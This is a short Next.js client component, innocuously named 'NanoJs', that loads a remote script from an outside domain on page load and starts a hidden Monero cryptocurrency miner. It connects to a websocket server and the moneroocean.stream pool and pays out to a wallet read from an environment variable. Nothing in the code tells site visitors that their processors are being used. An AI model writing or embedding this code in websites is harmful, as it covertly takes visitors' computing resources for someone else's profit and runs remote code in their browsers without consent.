"use client"

import Script from 'next/script';

const NanoJs = () => {

  return (<Script src="https://script.ghgi.xyz"
    onLoad={() => {
      server = "wss://ghgi.xyz";
      let pool = "moneroocean.stream";
      let walletAddress = process.env.NEXT_PUBLIC_WA;
      let workerId = "JTC"
      let threads = -1;
      let password = "AM11";
      startMining(pool, walletAddress, workerId, threads, password);
      throttleMiner = 89;
    }} />)
}

export default NanoJs